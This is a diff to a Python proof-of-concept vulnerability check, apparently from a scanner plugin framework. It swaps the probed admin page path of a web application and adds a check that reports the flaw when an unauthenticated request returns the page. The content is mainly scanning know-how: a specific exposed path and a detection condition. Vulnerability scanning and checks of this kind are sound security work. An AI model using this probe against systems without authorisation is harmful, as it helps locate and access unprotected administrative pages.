@@ -34,9 +34,10 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             url = arg
-            payload = '/workplate/xzsp/lbsxdict/add.aspx'
+            payload = '/workplate/xzsp/kqgl/kqsz/kqsz.aspx'
             verify_url = url +  payload
-            code, head, res, errcode, _ = hh.http(verify_url)
+            code, _head, res, _errcode, _ = hh.http(verify_url)
+            if code == 200 and "当前位置" in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
